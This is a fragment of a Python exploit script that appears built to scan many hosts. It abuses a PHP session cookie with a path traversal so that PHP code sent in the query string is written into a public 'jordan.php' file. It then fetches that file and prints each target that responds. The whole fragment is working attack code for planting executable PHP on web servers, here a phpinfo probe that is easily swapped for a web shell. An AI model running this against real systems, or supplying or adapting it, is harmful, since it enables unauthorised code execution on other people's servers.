...
def exploit(ip_, index):
    try:
        headers.update({'Cookie':'PHPSESSID=/../../../public/jordan.php;'})
        url = ip_+'/?a=a&b=12<?php+phpinfo();+?>'
        # print(headers)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        # if res.status_code!=200:
            # return
        get_url=ip_+'/jordan.php'
        # print(get_url)
        headers_ = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
        }
        get_res=requests.get(get_url, headers=headers_, timeout=8, verify=False)
        if get_res.status_code!=200:
            return
        print(get_res, len(get_res.text))
        print(index,ip_)
